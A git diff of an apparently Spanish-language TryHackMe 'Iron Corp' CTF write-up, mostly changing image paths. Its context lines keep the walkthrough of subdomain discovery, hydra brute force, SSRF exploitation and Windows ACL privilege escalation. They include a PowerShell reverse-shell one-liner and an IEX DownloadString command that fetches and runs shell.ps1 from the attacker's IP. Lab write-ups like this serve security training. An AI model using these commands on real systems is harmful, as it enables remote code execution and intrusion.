@@ -6,7 +6,7 @@ date: 2025-02-02 11:00:00 -0000
 categories: [TryHackMe]
 tags: [Windows, TryHackMe, SSRF, Gobuster, Meterpreter, PowerShell]
 image:
-  path: /assets/img/posts/ironcorp-thm/cabecera.png
+  path: /assets/img/writeups/tryhackme/ironcorp-thm/cabecera.png
   alt: Iron Corp
   caption: 
 description: >
@@ -100,9 +100,9 @@ Analizando el resultado del escaneo Nmap, hay varios puntos interesantes:
 
 Por lo que parece ambos servicios son pruebas de aplicaciones web.
 
-![alt text](/assets/img/posts/ironcorp-thm/image.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image.png)
 
-![alt text](/assets/img/posts/ironcorp-thm/image-1.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-1.png)
 
 # Investigando el servicio DNS
 
@@ -187,9 +187,9 @@ Ahora que tenemos los nombres de los subdominios podemos agregarlso a nuestro ar
 
 Ahora que tenemos el subdominio de ironcorp.me podemos revisar los servicios HTTP que están expuestos.
 
-![alt text](/assets/img/posts/ironcorp-thm/image-5.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-5.png)
 
-![alt text](/assets/img/posts/ironcorp-thm/image-2.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-2.png)
 
 Visitando el subdonmino admin.ironcorp.me parece haber un panel de administración protegido por crendeciales.
 
@@ -197,38 +197,38 @@ Visitando el subdonmino admin.ironcorp.me parece haber un panel de administraci�
 
 Visto el tipo de autenticación que está utilizando podemos intetar un ataque de fuerza bruta, en este caso mediante el uso de `hydra`.
 
-![alt text](/assets/img/posts/ironcorp-thm/image-3.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-3.png)
 
 Como vemos no ha tardado demasiado.
 
 La pagina parece bastante sencilla y el buscador no parece ser de mucha utilidad ahroa mismo pero, si nos fijamos en el parámetro que se le está pasando parece que si está intentando acceder a algún recurso.
 
-![alt text](/assets/img/posts/ironcorp-thm/image-4.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-4.png)
 
 Parece que hace puede hacer peticiones a recursos. Podemos aprovechar esto para intentar realizar LFI, RFI o SSRF.
 
-![alt text](/assets/img/posts/ironcorp-thm/image-6.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-6.png)
 
 Recordando la anterior página del dominio internal.ironcorp.me donde no teniamos autenticación, podemos intentar realizar la petición para ver que se devuelve.
 
-![alt text](/assets/img/posts/ironcorp-thm/image-7.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-7.png)
 
 Para hacerlo más sencillo siempre es bueno tener un proxy en el que podamos visualizar el rastro de las peticiones realizadas.
 
-![alt text](/assets/img/posts/ironcorp-thm/image-8.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-8.png)
 
 Parece que la aplicación web servida en internal.ironcorp.me está sirviendo una url donde puedes comprobar el nombre de usuario que lo está utilizando.
 
 Vamos a comprobar entonces que usuario es el administrador con el que nos hemos autenticado en admin.ironcorp.me.
 
-![alt text](/assets/img/posts/ironcorp-thm/image-9.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-9.png)
 
 Parece que el usuario es llamado "Equinox".
 Sabiendo esto podríamos pensar que está ejecuntando alguna comprobación para saber el usuario y, al ser el usuario que nos muestra diferente al que hemos utilizado para autenticanos podemos deducir que el lugar o servicio donde está comprobando no es el mismo en el que nos encontramos.
 
 ¿Quizás es ejecutado a nivel de sistema?
 
-![alt text](/assets/img/posts/ironcorp-thm/image-10.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-10.png)
 
 Eso parece.
 
@@ -263,17 +263,17 @@ powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.17.92
    - La primera codificación protege los caracteres especiales del payload
    - La segunda codificación protege los caracteres especiales de la URL interna que el servidor procesa
 
-![alt text](/assets/img/posts/ironcorp-thm/image-11.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-11.png)
 
-![alt text](/assets/img/posts/ironcorp-thm/image-12.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-12.png)
 
 ## User flag
 
-![alt text](/assets/img/posts/ironcorp-thm/image-13.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-13.png)
 
 Ya que estamos en un disco secundario hay que navegar a C:\Users\Administrator\Desktop\user.txt
 
-![alt text](/assets/img/posts/ironcorp-thm/image-14.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-14.png)
 
 # Escalando privilegios
 
@@ -281,15 +281,15 @@ Dando una vuelta por el sistema vemos que hay una carpeta de usuario llamada Sup
 
 Bueno para poder visualizar bien lo que va a ocurrir primero nos dirigimos a la carpeta de este usuario.
 
-![alt text](/assets/img/posts/ironcorp-thm/image-15.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-15.png)
 
 Según la ACL no tenemos acceso al contenido de la carpeta.
 
 Si miramos los privilegios de nuestro usuario.
 
-![alt text](/assets/img/posts/ironcorp-thm/image-16.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-16.png)
 
-![alt text](/assets/img/posts/ironcorp-thm/image-17.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-17.png)
 
 Efectivamente somos administradores del sistema.
 
@@ -297,15 +297,15 @@ La verdad no entendí mucho el concepto de esta CTF pero la idea es que no es ne
 
 No tenemos aceso a la carpeta de SuperAdmin debido a que explicitamente en las ACL se ha indicado que el grupo Administrators hay una denegación explícita (Deny).
 
-![alt text](/assets/img/posts/ironcorp-thm/image-19.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-19.png)
 
-![alt text](/assets/img/posts/ironcorp-thm/image-18.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-18.png)
 
 Bien lo interesante es que el usuario con SID (S-1-5-21-297466380-2647629429-287235700-1000) tiene FullControl sobre la carpeta de SuperAdmin.
 
 Si lo buscamos en el sistema vamos a ver que no existe.
 
-![alt text](/assets/img/posts/ironcorp-thm/image-20.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-20.png)
 
 Resumen:
    - Somos NT AUTHORITY\SYSTEM y no SuperAdmin. 
@@ -316,7 +316,7 @@ A pesar de haber intentado esacalar a un meterpreter, la situación no cambió y
 
 ## Root flag
 
-![alt text](/assets/img/posts/ironcorp-thm/image-21.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-21.png)
 
 # Bonus - Escalando Meterpreter
 
@@ -349,11 +349,11 @@ exploit
 IEX(New-Object Net.WebClient).DownloadString('http://10.8.17.92/shell.ps1')
 ```
 
-![alt text](/assets/img/posts/ironcorp-thm/image-22.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-22.png)
 
-![alt text](/assets/img/posts/ironcorp-thm/image-23.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-23.png)
 
 Tratando de impersonar al usuario SuperAdmin.
 
-![alt text](/assets/img/posts/ironcorp-thm/image-24.png)
+![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-24.png)
 
